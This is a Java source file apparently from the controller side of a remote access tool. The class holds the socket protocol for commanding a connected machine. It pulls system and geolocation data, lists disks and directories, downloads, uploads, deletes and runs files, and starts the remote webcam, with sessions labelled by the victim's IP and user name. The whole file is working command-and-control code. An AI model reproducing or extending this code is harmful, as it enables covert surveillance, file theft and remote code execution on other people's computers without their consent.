package Connections;


import Information.SystemInformation;
import Information.NetworkInformation;
import Information.Action;

import org.json.JSONObject;
import org.json.JSONTokener;


import java.io.*;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.stream.Stream;


public class Streams {
    static InputStream is;
    static OutputStream os;
    static DataInputStream dis;
    static DataOutputStream dos;
    private SystemInformation tempSystemInformation;
    private NetworkInformation tempNetworkInformation;
    private boolean webcamDialogOpen;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    public Streams(Socket socket) throws IOException {
        if (socket == null) throw new IllegalArgumentException();
        is = socket.getInputStream();
        os = socket.getOutputStream();
        dis = new DataInputStream(is);
        dos = new DataOutputStream(os);
    }

    public byte[] receiveBytes() {
        int fileSize = readSize();
        int total = 0;
        byte[] buffer = new byte[fileSize];
       // System.out.println("buffer size -> " + buffer.length);
        try {
            while (total < fileSize) {
                int read = dis.read(buffer, total, fileSize - total);
                total += read;
                //  System.out.println("total " + total + " /" + fileSize);
            }
            //System.out.println("REAL TOTAL -> " + total);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

//        System.out.println(total);

        return buffer;
    }


    public void receiveFile(String path) {
        String fileName = readString();
        File filePath = new File(path + "\\" + fileName);
        filePath.getParentFile().mkdirs();
        try {
            filePath.createNewFile();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        System.out.println("Name " + filePath);
        sendSize(-70);
        int fileSize = readSize();
        int read;
        int total = 0;
        byte[] buffer = new byte[1024];
        FileOutputStream fos;
        try {
            fos = new FileOutputStream(filePath);
        } catch (FileNotFoundException e) {
            throw new RuntimeException(e);
        }
        BufferedOutputStream bos = new BufferedOutputStream(fos);
        while (total < fileSize) {
            try {
                read = is.read(buffer);
                total += read;
                bos.write(buffer, 0, read);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

            System.out.println(total);
        }
        try {
            bos.flush();
            bos.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        System.out.println("File "
                + " downloaded (" + total + " bytes read)");

    }


    public void sendString(String message) {
        sendSize(message.length());
        byte[] buffer = message.getBytes();
        try {
            os.write(buffer);
            System.out.println("String sent");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        readSize();

    }


    private SystemInformation listToSystemInformation(List<String> list) {
        return new SystemInformation(list.get(0), list.get(1), list.get(2), list.get(3), list.get(4), list.get(5));
    }

    private NetworkInformation listToNetworkInformation(String jsonString) {
        JSONObject jsonObject = new JSONObject(jsonString);
        return new NetworkInformation(
                jsonObject.get("query").toString(),
                jsonObject.get("isp").toString(),
                jsonObject.get("continent").toString(),
                jsonObject.get("country").toString(),
                jsonObject.get("regionName").toString(),
                jsonObject.get("city").toString(),
                jsonObject.get("timezone").toString(),
                jsonObject.get("currency").toString(),
                jsonObject.getBoolean("proxy")
        );
    }

    public Object sendAndReadJSON(Action action) {
        switch (action) {
            case SYS_INFO -> {
                sendSize(0);
                List<String> informationList = readList();
                return listToSystemInformation(informationList);
            }
            case NET_INFO -> {
                sendSize(1);
                String networkJSON = readString();
                return listToNetworkInformation(networkJSON);
            }
            case DISK -> {
                sendSize(2);
                List<String> listOfDisks = readList();
                System.out.println(listOfDisks);
                return listOfDisks.toArray(new String[0]);
            }
            case REQUEST_WEBCAM -> {
                sendSize(16);
                return readList();
            }
        }
        return null;
    }

    public void sendJSON(Action action, List<String> destinations, int length) {
        switch (action) {
            case UPLOAD -> {
                sendSize(10);
                sendList(destinations);
                sendSize(length);
            }
        }
    }

    public void sendAndReadJSON(Action action, List<String> fileList, List<String> directoryList) {
        switch (action) {
            case COPY -> {
                sendSize(6);
                sendList(fileList);
                sendList(directoryList);
            }
        }
    }

    public void sendAndReadJSON(Action action, List<String> fileList, String directory) {
        switch (action) {
            case MOVE -> {
                sendSize(7);
                sendList(fileList);
                sendString(directory);
            }
        }
    }

    public List<String> sendAndReadJSON(Action action, String name) {
        switch (action) {
            case R_A_DIR -> {
                sendSize(3);
                sendString(name);
                return new ArrayList<>(Arrays.asList(readString().split("\\|")));
            }
            case R_FO_DIR -> {
                sendSize(4);
                sendString(name);
                return readList();
            }
        }
        return null;
    }

    public Object sendAndReadJSON(Action action, String selectedDevice, boolean fragmented, int fps) {
        switch (action) {
            case START_WEBCAM -> {
                sendSize(17);
                sendString(selectedDevice);
                sendSize(fragmented ? 1 : 0);
                sendSize(fps);
                return new int[]{readSize(), readSize()};
            }
        }
        return null;
    }


    public void sendAndReadJSON(Action action, List<String> fileList) {
        switch (action) {
            case DOWNLOAD -> {
                sendSize(5);
                sendList(fileList);
            }
            case DELETE -> {
                sendSize(8);
                sendList(fileList);
            }
            case RUN -> {
                sendSize(9);
                sendList(fileList);
            }
        }
    }


    public void sendList(List<String> fileList) {
        for (String file : fileList) {
            sendSize(0);
            sendString(file);
        }
        sendSize(-1);
    }

    public List<String> readList() {
        List<String> listOfFiles = new ArrayList<>();
        while (readSize() != -1) {
            listOfFiles.add(readString());
        }

        return listOfFiles;
    }

    public void sendSize(int size) {
        try {
            dos.writeInt(size);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public int readSize() {
        try {
            return dis.readInt();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public String readString() {
        int size = readSize();
        byte[] buffer = new byte[1024];
        StringBuilder sb = new StringBuilder();
        int total = 0;
        int read;
        while (total < size) {
            try {
                read = is.read(buffer);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            total += read;
            sb.append(new String(buffer, 0, read));
        }
        sendSize(-20);
        return sb.toString();
    }


    public String getSessionFolder() {
        return "Session - " + getIdentifier();
    }

    public String getIdentifier() {
        return tempNetworkInformation.IP() + " - " + tempSystemInformation.USER_NAME();
    }

    public SystemInformation getTempSystemInformation() {
        return tempSystemInformation;
    }

    public void setTempSystemInformation(SystemInformation tempSystemInformation) {
        this.tempSystemInformation = tempSystemInformation;
    }

    public NetworkInformation getTempNetworkInformation() {
        return tempNetworkInformation;
    }

    public void setTempNetworkInformation(NetworkInformation tempNetworkInformation) {
        this.tempNetworkInformation = tempNetworkInformation;
    }

    public boolean isWebcamDialogOpen() {
        return webcamDialogOpen;
    }

    public void setWebcamDialogOpen(boolean webcamDialogOpen) {
        this.webcamDialogOpen = webcamDialogOpen;
    }

    public ExecutorService getExecutor() {
        return executor;
    }

    public DataOutputStream getDos() {
        return dos;
    }
    public DataInputStream getDis() {
        return dis;
    }
}